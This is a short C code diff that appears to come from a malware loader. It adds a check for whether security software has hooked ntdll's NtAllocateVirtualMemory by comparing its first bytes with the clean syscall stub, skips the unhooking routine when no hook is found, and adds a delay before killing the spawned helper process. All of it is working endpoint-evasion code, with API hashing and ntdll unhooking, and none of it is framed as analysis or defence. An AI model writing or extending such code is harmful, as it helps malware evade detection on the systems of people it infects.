@@ -19,7 +19,19 @@ BOOL evasion_unhook_ntdll_process_load_apis(void) {
         g_ldr->apis->ReadProcessMemory && g_ldr->apis->TerminateProcess);
 }
 
+BOOL is_ntdll_hooked() {
+    FARPROC addr = GetProc(g_ldr->apis->modules.ntdll, HASHED_NTALLOCATEVIRTUALMEMORY);
+    BYTE clean[] = { 0x4C, 0x8B, 0xD1, 0xB8 };
+    PBYTE func = (PBYTE)addr;
+
+    for (int i = 0; i < sizeof(clean); i++) {
+        if (func[i] != clean[i]) return TRUE;
+    }
+    return FALSE;
+}
+
 BOOL evasion_unhook_ntdll_process(void) {
+    if (!is_ntdll_hooked()) return TRUE;
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
@@ -53,6 +65,7 @@ BOOL evasion_unhook_ntdll_process(void) {
         }
     }
 
+    Sleep(5000);
     g_ldr->apis->TerminateProcess(pi.hProcess, 0);
     g_ldr->apis->CloseHandle(pi.hProcess);
     g_ldr->apis->CloseHandle(pi.hThread);
